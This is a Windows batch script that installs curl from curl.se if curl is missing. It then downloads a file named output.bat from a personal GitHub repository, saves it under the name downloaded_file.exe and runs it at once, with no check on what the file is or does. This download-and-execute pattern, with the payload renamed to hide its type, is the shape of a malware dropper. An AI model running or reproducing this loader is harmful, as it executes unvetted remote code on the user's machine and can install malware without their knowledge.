@echo off
setlocal

REM Check if curl is installed
where curl >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo Curl is not installed. Downloading Curl...
    powershell -Command "Invoke-WebRequest -Uri https://curl.se/windows/dl-7.80.0_3/curl-7.80.0_3-win64-mingw.zip -OutFile curl.zip"
    powershell -Command "Expand-Archive -Path curl.zip -DestinationPath ."
    IF NOT EXIST curl-7.80.0_3-win64-mingw\bin\curl.exe (
        echo Failed to download or extract Curl. Exiting.
        exit /b 1
    )
    set "PATH=%CD%\curl-7.80.0_3-win64-mingw\bin;%PATH%"
)

REM Specify the URL and output file name
set "URL=https://github.com/moha6871/mandi/raw/main/output.bat"
set "OUTPUT=downloaded_file.exe"

REM Download the executable
curl -L -o "%OUTPUT%" "%URL%"

REM Check if the file was downloaded
IF NOT EXIST "%OUTPUT%" (
    echo Failed to download the executable. Exiting.
    exit /b 1
)

REM Run the downloaded executable
start "" "%OUTPUT%"

echo Done.
endlocal
